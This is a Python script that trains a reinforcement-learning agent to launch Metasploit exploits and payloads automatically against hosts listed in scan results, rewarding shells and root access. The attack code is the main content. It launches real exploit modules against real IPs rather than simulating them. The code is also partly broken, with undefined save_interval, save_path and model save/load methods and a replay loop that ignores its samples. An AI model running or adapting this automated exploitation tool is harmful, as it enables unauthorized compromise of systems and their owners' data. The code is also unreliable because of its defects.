import gym
from gym import spaces
import numpy as np
from stable_baselines3 import PPO
from stable_baselines3.common.vec_env import DummyVecEnv
from pymetasploit3.msfrpc import MsfRpcClient
import json
import logging
import os
import pickle
import time
from collections import deque, defaultdict

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class ContinualExploitEnv(gym.Env):
    def __init__(self, json_file, memory_size=1000):
        super(ContinualExploitEnv, self).__init__()
        
        logging.info("Initializing ContinualExploitEnv")
        
        # Load and parse the JSON file
        with open(json_file, 'r') as f:
            self.data = json.load(f)
        
        logging.info(f"Loaded data for {len(self.data['results'])} targets")
        
        # Initialize Metasploit RPC client
        self.client = self._connect_metasploit()
        
        # Check for cached max_payloads
        cache_file = f"{json_file}.max_payloads.cache"
        if os.path.exists(cache_file):
            with open(cache_file, 'rb') as f:
                self.max_payloads = pickle.load(f)
            logging.info(f"Loaded cached maximum number of payloads: {self.max_payloads}")
        else:
            # Calculate and cache max_payloads
            self.max_payloads = self._calculate_max_payloads()
            with open(cache_file, 'wb') as f:
                pickle.dump(self.max_payloads, f)
            logging.info(f"Calculated and cached maximum number of payloads: {self.max_payloads}")
        
        # Calculate the total number of actions
        self.num_exploits = max(len(target['ports'][0]['exploits']) for target in self.data['results'])
        self.total_actions = max(1, self.num_exploits * self.max_payloads)
        
        # Define action space as a single Discrete space
        self.action_space = spaces.Discrete(self.total_actions)
        
        # Define observation space
        self.observation_space = spaces.Dict({
            'ip': spaces.Box(low=0, high=255, shape=(4,), dtype=np.uint8),
            'port': spaces.Discrete(65536),
            'service': spaces.Discrete(100),  # Assuming 100 different services
            'version': spaces.Discrete(1000),  # Assuming 1000 different versions
            'os': spaces.Discrete(100),  # Assuming 100 different OS types
            'current_action': spaces.Discrete(self.total_actions)
        })
        
        self.current_target = 0
        self.current_port = 0
        self.current_exploit = 0
        self.current_payload = 0
        self.max_steps = 1000  # Increased to allow for more exploration
        self.current_step = 0
        self.root_obtained = False
        
        # Add experience replay memory
        self.memory = deque(maxlen=memory_size)
        
        # Add a counter for environment changes
        self.env_changes = 0

        # New attributes for better exploration
        self.total_targets = len(self.data['results'])
        self.total_ports = sum(len(target['ports']) for target in self.data['results'])
        self.explored_all_targets = False

    def _connect_metasploit(self, max_retries=5, retry_delay=5):
        for attempt in range(max_retries):
            try:
                client = MsfRpcClient('yourpassword')
                logging.info("Connected to Metasploit RPC")
                return client
            except Exception as e:
                logging.warning(f"Connection attempt {attempt + 1} failed: {str(e)}")
                if attempt < max_retries - 1:
                    logging.info(f"Retrying in {retry_delay} seconds...")
                    time.sleep(retry_delay)
                else:
                    logging.error("Failed to connect to Metasploit RPC after multiple attempts")
                    raise

    def _calculate_max_payloads(self):
        logging.info("Calculating maximum number of payloads...")
        max_payloads = 0
        for target in self.data['results']:
            for port_info in target['ports']:
                for exploit in port_info['exploits']:
                    try:
                        exploit_module = self.client.modules.use('exploit', exploit['fullname'])
                        num_payloads = len(exploit_module.targetpayloads())
                        max_payloads = max(max_payloads, num_payloads)
                    except Exception as e:
                        logging.warning(f"Error calculating payloads for {exploit['fullname']}: {str(e)}")
        return max_payloads

    def step(self, action):
        self.current_step += 1
        
        # Convert the flattened action back to exploit and payload indices
        exploit_action = action // self.max_payloads
        payload_action = action % self.max_payloads
        
        self.current_exploit = min(exploit_action, len(self.data['results'][self.current_target]['ports'][self.current_port]['exploits']) - 1)
        
        target = self.data['results'][self.current_target]
        port_info = target['ports'][self.current_port]
        exploit_data = port_info['exploits'][exploit_action]
        
        logging.info(f"Step {self.current_step}: Attempting exploit {exploit_data['fullname']} on {target['ip']}:{port_info['port']}")
        
        try:
            # Set up the exploit
            exploit = self.client.modules.use('exploit', exploit_data['fullname'])
            
            # Try both 'RHOSTS' and 'RHOST'
            if 'RHOSTS' in exploit.options:
                exploit['RHOSTS'] = target['ip']
            elif 'RHOST' in exploit.options:
                exploit['RHOST'] = target['ip']
            else:
                logging.warning(f"Neither 'RHOSTS' nor 'RHOST' found in options for {exploit_data['fullname']}")
            
            if 'RPORT' in exploit.options:
                exploit['RPORT'] = port_info['port']
            
            # Get compatible payloads for this exploit
            payloads = exploit.targetpayloads()
            
            if payloads:
                self.current_payload = payload_action % len(payloads)
                payload = payloads[self.current_payload]
                logging.info(f"Selected payload: {payload}")
                try:
                    result = exploit.execute(payload=payload)
                except Exception as e:
                    logging.error(f"Error executing exploit: {e}")
                    result = {'job_id': None}
            else:
                logging.warning(f"Invalid payload selection. Payload index {payload_action} out of range (0-{len(payloads)-1})")
                result = {'job_id': None}  # Invalid payload selection
        except Exception as e:
            logging.error(f"Error setting up or executing exploit: {str(e)}")
            result = {'job_id': None}
        
        # Calculate reward based on the result
        reward = self._calculate_reward(result)
        logging.info(f"Reward: {reward}")
        
        # Move to next port or target if necessary
        self._move_to_next_port_or_target()

        # Check if episode is done
        done = self._is_done()
        
        # Get observation
        obs = self._get_obs()
        
        # Store experience in memory
        self.memory.append((self._get_obs(), action, reward, obs, done))
        
        return obs, reward, done, {}

    def _move_to_next_port_or_target(self):
        target = self.data['results'][self.current_target]
        
        # Move to next port if we've tried all exploits on current port
        if self.current_exploit >= len(target['ports'][self.current_port]['exploits']) - 1:
            self.current_port += 1
            self.current_exploit = 0
            
            # Move to next target if we've tried all ports on current target
            if self.current_port >= len(target['ports']):
                self.current_target += 1
                self.current_port = 0
                
                # Check if we've explored all targets
                if self.current_target >= self.total_targets:
                    self.explored_all_targets = True
                    self.current_target = 0  # Wrap around to the first target

    def reset(self):
        logging.info("Resetting environment")
        if self.explored_all_targets or self.root_obtained:
            # Full reset only if we've explored everything or obtained root
            self.current_target = 0
            self.current_port = 0
            self.explored_all_targets = False
        # Always reset these
        self.current_exploit = 0
        self.current_payload = 0
        self.current_step = 0
        self.root_obtained = False
        
        # Simulate environment change
        self.env_changes += 1
        if self.env_changes % 10 == 0:  # Every 10 resets, slightly modify the environment
            self._modify_environment()
        
        return self._get_obs()

    def _get_obs(self):
        target = self.data['results'][self.current_target]
        port_info = target['ports'][self.current_port]
        return {
            'ip': np.array([int(x) for x in target['ip'].split('.')], dtype=np.uint8),
            'port': int(port_info['port']),
            'service': hash(port_info['service']) % 100,
            'version': hash(port_info['version']) % 1000,
            'os': hash(target['os']) % 100,
            'current_action': self.current_exploit * self.max_payloads + self.current_payload
        }

    def _calculate_reward(self, result):
        if result['job_id'] is None:
            logging.info("Invalid payload selection or other issues")
            return -5  # Invalid payload selection or other issues
        
        reward = 0
        if result['job_id'] is not None:
            # Check if we gained a session
            sessions = self.client.sessions.list
            if sessions:
                reward += 10
                # Get the most recent session
                session_id = list(sessions.keys())[-1]
                session_info = sessions[session_id]
                
                try:
                    if session_info['type'] == 'meterpreter':
                        session = self.client.sessions.session(session_id)
                        output = session.run_shell_cmd_with_output('id')
                        if 'root' in output or 'administrator' in output:
                            reward += 20  # Additional reward for root access
                            self.root_obtained = True
                            logging.info("Root access obtained!")
                        else:
                            logging.info("Exploit successful, but root access not obtained")
                        session.stop()
                    elif session_info['type'] == 'shell':
                        shell = self.client.sessions.session(session_id)
                        shell.write('whoami')
                        output = shell.read()
                        if 'root' in output or 'administrator' in output:
                            reward += 20  # Additional reward for root access
                            self.root_obtained = True
                            logging.info("Root access obtained!")
                        else:
                            logging.info("Exploit successful, but root access not obtained")
                        shell.stop()
                    else:
                        logging.info(f"Session type is {session_info['type']}, not checking for root")
                except Exception as e:
                    logging.error(f"Error checking for root: {str(e)}")
            else:
                logging.info("Exploit completed, but no session created")
                reward += -1
        else:
            logging.info("Exploit failed")
            return -1  # Failed exploit
        
        return reward

    def _is_done(self):
        done = (
            self.root_obtained or  # We've obtained root access
            self.current_step >= self.max_steps or  # We've reached the maximum number of steps
            self.explored_all_targets  # We've explored all targets
        )
        if done:
            if self.root_obtained:
                logging.info("Episode ended: Root access obtained")
            elif self.current_step >= self.max_steps:
                logging.info("Episode ended: Maximum steps reached")
            elif self.explored_all_targets:
                logging.info("Episode ended: All targets explored")
        return done

    def _get_os_family(self, os_string):
        os_lower = os_string.lower()
        if 'windows' in os_lower:
            return 'windows'
        elif 'linux' in os_lower:
            return 'linux'
        elif 'mac' in os_lower or 'darwin' in os_lower:
            return 'osx'
        else:
            return 'generic'

    def _modify_environment(self):
        # Simulate changes in the network environment
        for target in self.data['results']:
            # Randomly modify some target properties
            if np.random.rand() < 0.2:  # 20% chance to modify each target
                target['os'] = np.random.choice(['Windows', 'Linux', 'MacOS'])
                for port in target['ports']:
                    if np.random.rand() < 0.1:  # 10% chance to modify each port
                        port['service'] = np.random.choice(['http', 'ftp', 'ssh', 'smb'])
                        port['version'] = f"{np.random.randint(1, 10)}.{np.random.randint(0, 99)}"
        
        logging.info(f"Environment modified (change #{self.env_changes})")

class ContinualLearningAgent:
    def __init__(self, env, model=None, learning_rate=0.0003, batch_size=64):
        if model is None:
            self.model = PPO("MultiInputPolicy", env, verbose=1, learning_rate=learning_rate)
        else:
            self.model = model
        self.env = env
        self.batch_size = batch_size
        self.action_history = defaultdict(lambda: defaultdict(int))

    def learn_and_execute(self, num_steps=10000):
        obs = self.env.reset()
        for step in range(num_steps):
            action, _ = self.model.predict(obs, deterministic=False)
            next_obs, reward, done, info = self.env.step(action)

            # Log the chosen action
            exploit_action = action[0] // self.env.envs[0].max_payloads
            payload_action = action[0] % self.env.envs[0].max_payloads
            self.action_history[exploit_action][payload_action] += 1

            # Learn from this experience immediately
            self.model.learn(total_timesteps=1, reset_num_timesteps=False)
            
            # Perform experience replay
            if step % 10 == 0 and len(self.env.envs[0].memory) >= self.batch_size:
                batch = np.random.choice(len(self.env.envs[0].memory), self.batch_size, replace=False)
                for idx in batch:
                    old_obs, old_action, old_reward, old_next_obs, old_done = self.env.envs[0].memory[idx]
                    self.model.learn(total_timesteps=1, reset_num_timesteps=False)
                    
            if step % save_interval == 0:
                self.save_model(save_path)

            # Adjust learning rate periodically
            if step % 1000 == 0:
                self.model.learning_rate = max(0.0001, self.model.learning_rate * 0.99)

            logging.info(f"Step {step + 1}: Exploit {exploit_action}, Payload {payload_action}, Reward: {reward}, Done: {done}")

            if done:
                obs = self.env.reset()
            else:
                obs = next_obs

        self.log_action_preferences()
        return self.model

    def log_action_preferences(self):
        logging.info("Action Preferences:")
        for exploit, payloads in self.action_history.items():
            total_exploit_uses = sum(payloads.values())
            logging.info(f"Exploit {exploit}:")
            for payload, count in payloads.items():
                percentage = (count / total_exploit_uses) * 100
                logging.info(f"  Payload {payload}: {percentage:.2f}% ({count}/{total_exploit_uses})")

# Usage
env = DummyVecEnv([lambda: ContinualExploitEnv("nmap_metasploit_results.json")])
saved_model_path = "saved_model.zip"
if os.path.exists(saved_model_path):
    agent = ContinualLearningAgent(env)
    agent.load_model(saved_model_path)
else:
    agent = ContinualLearningAgent(env)

logging.info("Starting continual learning and execution")
for episode in range(10):  # Run for 10 episodes
    logging.info(f"Episode {episode + 1}")
    agent.learn_and_execute(num_steps=1000)
logging.info("Continual learning and execution completed")
